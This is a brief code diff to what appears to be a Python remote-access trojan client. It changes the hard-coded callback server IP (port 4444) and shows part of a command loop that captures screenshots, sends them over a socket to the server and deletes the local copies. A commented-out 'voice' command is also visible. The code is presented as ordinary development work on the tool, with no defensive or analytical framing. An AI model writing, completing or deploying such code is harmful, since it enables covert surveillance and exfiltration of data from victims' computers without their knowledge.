@@ -15,7 +15,7 @@ if IS_WINDOWS:
     import winreg
 
 
-SERVER_IP = "192.168.196.1"
+SERVER_IP = "192.168.162.1"
 SERVER_PORT = 4444
 
 
@@ -184,6 +184,7 @@ def handle_commands(client_socket):
                     if wait_for_file(latest):
                         send_file(client_socket, latest, "screenshot")
                         os.remove(latest)
+
 
             # elif command == "voice":
             #     safe_run(VOICE_EXE)  
